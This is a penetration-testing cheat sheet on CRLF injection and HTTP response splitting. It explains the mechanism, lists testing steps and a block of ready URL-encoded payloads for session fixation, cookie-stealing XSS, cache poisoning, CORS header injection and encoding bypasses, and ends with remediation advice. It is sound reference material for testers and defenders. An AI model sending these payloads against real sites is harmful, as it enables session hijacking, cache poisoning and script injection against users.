# CRLF Injection

## Overview
CRLF (Carriage Return `\r` / Line Feed `\n`) injection exploits the fact that HTTP headers are delimited by `\r\n` sequences. When user input containing these characters is embedded in HTTP response headers without sanitization, an attacker can inject new headers or split the response into multiple separate HTTP responses — enabling cookie injection, cache poisoning, XSS, and response splitting attacks.

## How It Works
- HTTP headers are terminated by `\r\n`; a header section ends with `\r\n\r\n`.
- If user input `value\r\nX-Injected: evil` lands in a header, the parser sees two separate headers.
- Two consecutive `\r\n\r\n` sequences split the header section and body, enabling response splitting.
- Caching proxies may cache the attacker-crafted second response and serve it to legitimate users.

## Impact
- HTTP Response Splitting → cache poisoning (poisoning shared caches for all users).
- Session fixation via injected `Set-Cookie` header.
- XSS via injected `Content-Type: text/html` + body injection.
- Phishing: inject a redirect `Location` header.
- CORS bypass by injecting `Access-Control-Allow-Origin: *`.
- Security header removal (overwriting CSP, HSTS).

## Where to Look
- Same as HTTP Header Injection: any parameter reflected in response headers.
- `?redirect=`, `?url=`, `?next=`, `?lang=`, `?charset=`.
- URL path segments reflected in `Location` headers on redirect.
- Cookie values reflected back in `Set-Cookie`.

## Testing Steps
1. Identify parameters reflected in response headers (use Burp to check response headers tab).
2. Submit URL-encoded CRLF: `%0d%0a` in the parameter value.
3. Add a custom header after: `?url=https://good.com%0d%0aX-Custom:%20injected`.
4. Verify `X-Custom: injected` appears as a response header.
5. Escalate: inject `Set-Cookie` to perform session fixation.
6. Inject `Content-Type: text/html\r\n\r\n<html><script>alert(1)</script>` for XSS.
7. Try bypasses: `%250d%250a` (double URL-encode), `%E5%98%8D%E5%98%8A` (Unicode), `\r`, `\n` alone.

## Payloads / Techniques
```
# Basic CRLF detection
?url=https://example.com%0d%0aX-Test:%20injected

# Session fixation
?lang=en%0d%0aSet-Cookie:%20SESSION=attacker_controlled

# XSS via response splitting
?url=a%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>

# Cache poisoning response split
?next=/foo%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Cached poison</html>

# Inject Access-Control header
?redirect=https://example.com%0d%0aAccess-Control-Allow-Origin:%20*

# Unicode bypass
%E5%98%8D%E5%98%8ASet-Cookie:%20admin=true

# Mixed encoding bypass
%0d%0a → try: \r\n, %0A%0D, \n\r
```

```bash
# Using crlfuzz
crlfuzz -u "https://target.com/redirect?url=https://example.com"
```

## Burp Suite Tips
- Check response headers in Repeater after submitting `%0d%0aX-Test:%20injected` in each parameter.
- **CRLF Injection Scanner** BApp extension runs automated CRLF tests.
- **Active Scanner** (Pro) includes CRLF injection tests.
- Use **Comparer** to diff normal vs. injected responses to spot added headers.

## Tools
- crlfuzz — https://github.com/dwisiswant0/crlfuzz
- Burp Suite CRLF Injection Scanner extension
- curl with `--include` to see response headers

## Remediation
- Strip `\r` (`%0d`) and `\n` (`%0a`) from any user input placed in HTTP response headers.
- Use framework HTTP response utilities that encode header values properly.
- Validate redirect targets against a strict allowlist.
- Apply WAF rules to block requests containing CRLF sequences in header-injecting parameters.
- Modern frameworks (Django, Rails, Express) strip CRLF from headers by default — ensure you're not bypassing this via custom header-writing code.

## References
https://owasp.org/www-community/vulnerabilities/CRLF_Injection
https://portswigger.net/web-security/request-smuggling
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
